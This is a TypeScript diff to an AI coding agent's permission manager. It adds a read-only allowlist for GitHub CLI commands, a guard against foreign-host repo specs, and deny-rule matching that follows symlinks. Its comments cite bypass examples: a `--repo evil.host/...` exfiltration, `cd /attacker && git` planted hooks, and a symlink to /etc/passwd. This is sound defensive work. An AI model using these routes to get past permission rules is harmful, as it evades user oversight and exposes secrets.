@@ -1314,6 +1314,28 @@ const DOCKER_SAFE_SUBCOMMANDS = new Set([
 ]);
 
 /** Compound safe prefixes: "command subcommand" pairs that are safe. */
+/**
+ * GitHub CLI (`gh`) read-only subcommand groups — the `<group> <subcommand>`
+ * pairs (the `gh` prefix stripped) that only display/list data. These feed
+ * {@link SAFE_PREFIXES} (as `gh <pair>`) so the bash classifier can auto-approve
+ * them, and {@link isGhInvocationReadOnly} re-checks the exact pair plus the
+ * HOST/OWNER/REPO exfil guard. Mirrors Claude Code's GH_READ_ONLY_COMMANDS
+ * (utils/shell/readOnlyCommandValidation.ts). Write/browser subcommands
+ * (`gh pr create`, `gh pr merge`, `gh api`, `… --web`) are deliberately absent so
+ * they fall through to a prompt.
+ */
+const GH_READ_ONLY_SUBCOMMANDS: ReadonlySet<string> = new Set([
+  'pr view', 'pr list', 'pr diff', 'pr checks', 'pr status',
+  'issue view', 'issue list', 'issue status',
+  'repo view',
+  'run list', 'run view',
+  'auth status',
+  'release list', 'release view',
+  'workflow list', 'workflow view',
+  'label list',
+  'search repos', 'search issues', 'search prs', 'search commits', 'search code',
+]);
+
 const SAFE_PREFIXES = new Set([
   'git status', 'git log', 'git diff', 'git branch', 'git show',
   'git remote', 'git tag', 'git stash list', 'git rev-parse',
@@ -1325,6 +1347,12 @@ const SAFE_PREFIXES = new Set([
   'cargo build', 'cargo check', 'cargo test', 'cargo clippy',
   'go build', 'go test', 'go vet', 'go fmt',
   'make build', 'make test', 'make check', 'make lint',
+  // GitHub CLI (`gh`) read-only subcommands — displays/lists only. Each is still
+  // revalidated by {@link isGhReadOnlyCommandSafe} in the classifier before
+  // auto-approval so the HOST/OWNER/REPO exfil guard ({@link ghArgsTargetForeignHost})
+  // can veto a `--repo host/owner/repo` that would reach a foreign host. Mirrors
+  // Claude's GH_READ_ONLY_COMMANDS catalog (readOnlyCommandValidation.ts).
+  ...[...GH_READ_ONLY_SUBCOMMANDS].map(s => `gh ${s}`),
 ]);
 
 /**
@@ -2397,6 +2425,85 @@ export function isGitReadOnlyCommandSafe(command: string): boolean {
     }
   }
   if (hasCd && hasGit) return false;
+  return true;
+}
+
+/**
+ * HOST/OWNER/REPO exfiltration guard for `gh` read-only commands. A normal repo
+ * spec is `OWNER/REPO` (exactly one `/`). Any token (or `--flag=value` inline
+ * value) that names a FOREIGN host — a URL scheme (`https://`, `git://`, …), an
+ * SSH-style `git@host:owner/repo`, or a 3+-segment `host/owner/repo` (2+ slashes)
+ * — redirects the read at an attacker-chosen remote and must NOT be auto-approved.
+ * Mirrors Claude's `ghIsDangerousCallback` (readOnlyCommandValidation.ts).
+ * `args` is the token list AFTER the `gh <group> <subcommand>` pair.
+ */
+export function ghArgsTargetForeignHost(args: string[]): boolean {
+  for (const token of args) {
+    if (!token) continue;
+    // For a flag token, only its inline `=value` can carry a repo spec; a bare
+    // flag (its value is the NEXT token) is inspected on that next iteration.
+    let value = token;
+    if (token.startsWith('-')) {
+      const eqIdx = token.indexOf('=');
+      if (eqIdx === -1) continue;
+      value = token.slice(eqIdx + 1);
+      if (!value) continue;
+    }
+    if (!value.includes('/') && !value.includes('://') && !value.includes('@')) continue;
+    if (value.includes('://')) return true; // explicit URL scheme
+    if (value.includes('@')) return true;   // ssh-style git@host:owner/repo
+    const slashCount = (value.match(/\//g) || []).length;
+    if (slashCount >= 2) return true;        // host/owner/repo (3+ segments)
+  }
+  return false;
+}
+
+/**
+ * Is a single `gh` invocation (tokens beginning at the `gh` token) a genuinely
+ * read-only form? True only when the leading `<group> <subcommand>` pair is in
+ * {@link GH_READ_ONLY_SUBCOMMANDS} AND no argument targets a foreign host
+ * ({@link ghArgsTargetForeignHost}). A non-`gh` token list is not our concern
+ * (returns true). Everything unlisted (`gh pr create`, `gh api`, bare `gh`) is
+ * NOT read-only, so it falls through to a prompt. Mirrors Claude's per-command
+ * GH_READ_ONLY_COMMANDS lookup + dangerous-callback.
+ */
+export function isGhInvocationReadOnly(tokens: string[]): boolean {
+  if (tokens[0] !== 'gh') return true; // not a gh invocation — not our concern
+  // Collect the leading non-flag words (the command group + subcommand). gh has no
+  // value-taking GLOBAL flags before the command group, so a leading flag means an
+  // unrecognized form (e.g. `gh --version`) that is not auto-approvable.
+  const words: string[] = [];
+  let idx = 1;
+  for (; idx < tokens.length && words.length < 2; idx++) {
+    const t = tokens[idx]!;
+    if (t.startsWith('-')) break;
+    words.push(t);
+  }
+  if (words.length < 2) return false; // bare `gh` / `gh <group>` without a subcommand
+  const pair = `${words[0]} ${words[1]}`;
+  if (!GH_READ_ONLY_SUBCOMMANDS.has(pair)) return false;
+  return !ghArgsTargetForeignHost(tokens.slice(1 + words.length));
+}
+
+/**
+ * Whole-command `gh` read-only guard for the bash classifier — the gh analogue of
+ * {@link isGitReadOnlyCommandSafe}. Splits a (possibly compound) command into
+ * segments and refuses if ANY `gh` invocation is not a read-only form
+ * ({@link isGhInvocationReadOnly}). Non-gh segments are classified by the rest of
+ * the classifier (destructive/unsafe guards run before this), so a compound that
+ * pairs a safe `gh` read with a write is not whitewashed here.
+ */
+export function isGhReadOnlyCommandSafe(command: string): boolean {
+  const unwrapped = unwrapShellControlStructures(command);
+  const segments = unwrapped.split(/\s*(?:\|\||&&|[|;])\s*/).filter(s => s.trim());
+  for (const seg of segments) {
+    const tokens = seg.trim().split(/\s+/);
+    let i = 0;
+    while (i < tokens.length && /^[A-Za-z_]\w*=/.test(tokens[i]!)) i++;
+    if (tokens[i] === 'gh') {
+      if (!isGhInvocationReadOnly(tokens.slice(i))) return false;
+    }
+  }
   return true;
 }
 
@@ -4656,6 +4763,11 @@ export class PermissionManager {
         // sandbox escape (`cd /attacker && git ...` runs planted .git/hooks).
         // Validate the full command before auto-allowing.
         if (cmd.startsWith('git ') && !isGitReadOnlyCommandSafe(unwrapped)) return 'unsafe';
+        // A `gh` read-only prefix can still exfiltrate via a foreign HOST/OWNER/REPO
+        // spec (`gh pr list --repo evil.host/owner/repo`) or smuggle a write in a
+        // compound. Revalidate the full command before auto-allowing (gh analogue of
+        // the git guard above). Mirrors Claude's ghIsDangerousCallback.
+        if (cmd.startsWith('gh ') && !isGhReadOnlyCommandSafe(unwrapped)) return 'unsafe';
         // Reject `$`-substitution in ANY auto-allowed compound/external read
         // command (git, gh, npm, go, cargo, make, …) — the validator sees the
         // literal `$VAR`/`$(cmd)` text but the shell expands it at runtime, a
@@ -5277,11 +5389,17 @@ export class PermissionManager {
       if (!this.toolNameMatches(rule.tool, toolName)) continue;
       if (rule.paramPattern && !this.paramMatches(rule.paramPattern, input)) continue;
       if (rule.pattern) {
-        const inputStr = this.inputToString(toolName, input);
-        const matched = toolName === 'bash' && typeof input.command === 'string'
-          ? matchBashPattern(rule.pattern, inputStr, 'deny')
-          : matchPattern(rule.pattern, inputStr, this.pathRuleCaseInsensitive(toolName));
-        if (matched) return true;
+        if (toolName === 'bash' && typeof input.command === 'string') {
+          if (matchBashPattern(rule.pattern, input.command, 'deny')) return true;
+        } else {
+          // File-path tools: match the rule against the literal path AND every
+          // symlink-resolved form so a deny cannot be bypassed via an in-workspace
+          // symlink to a denied target.
+          const ci = this.pathRuleCaseInsensitive(toolName);
+          for (const form of this.fileRuleMatchStrings(toolName, input)) {
+            if (matchPattern(rule.pattern, form, ci)) return true;
+          }
+        }
       } else {
         return true;
       }
@@ -5302,6 +5420,29 @@ export class PermissionManager {
   }
 
   /**
+   * The path strings a FILE-PATH deny/ask RULE must be matched against: the raw
+   * input path AND every symlink hop of its resolved real path
+   * ({@link getPathsForPermissionCheck}). An in-workspace symlink pointing at a
+   * denied target (`./link -> /etc/passwd`, `file_read(./link)`) must be caught by
+   * a `file_read(/etc/**)` deny rule even though the literal argument is `./link`.
+   * For a non-file tool (or when no file path is present) this is just the single
+   * canonical input string, so bash/other rule matching is unchanged. Mirrors
+   * Claude's getPathsForPermissionCheck threaded through deny/ask rule matching
+   * (utils/permissions/filesystem.ts L1081-1101).
+   */
+  private fileRuleMatchStrings(toolName: string, input: Record<string, unknown>): string[] {
+    const base = this.inputToString(toolName, input);
+    if (!FILE_PATH_RULE_TOOLS.has(normalizeToolName(toolName))) return [base];
+    const fp = input.file_path ?? input.path;
+    if (typeof fp !== 'string' || !fp) return [base];
+    const forms = new Set<string>([base]);
+    try {
+      for (const hop of getPathsForPermissionCheck(expandPath(fp, process.cwd()))) forms.add(hop);
+    } catch { /* resolution failure (e.g. a non-existent write target) — literal only */ }
+    return [...forms];
+  }
+
+  /**
    * Does any user-configured `ask` rule match this tool+input? Mirrors
    * {@link anyDenyMatches} but for content-specific `ask` rules. Used to keep
    * explicit `ask` rules BYPASS-IMMUNE: a user's `{tool, action:'ask'}` rule must
@@ -5315,11 +5456,15 @@ export class PermissionManager {
       if (!this.toolNameMatches(rule.tool, toolName)) continue;
       if (rule.paramPattern && !this.paramMatches(rule.paramPattern, input)) continue;
       if (rule.pattern) {
-        const inputStr = this.inputToString(toolName, input);
-        const matched = toolName === 'bash' && typeof input.command === 'string'
-          ? matchBashPattern(rule.pattern, inputStr, 'ask')
-          : matchPattern(rule.pattern, inputStr);
-        if (matched) return true;
+        if (toolName === 'bash' && typeof input.command === 'string') {
+          if (matchBashPattern(rule.pattern, input.command, 'ask')) return true;
+        } else {
+          // File-path tools: an `ask` rule stays bypass-immune for the literal path
+          // AND its symlink-resolved forms (parity with the deny matching above).
+          for (const form of this.fileRuleMatchStrings(toolName, input)) {
+            if (matchPattern(rule.pattern, form)) return true;
+          }
+        }
       } else {
         return true;
       }
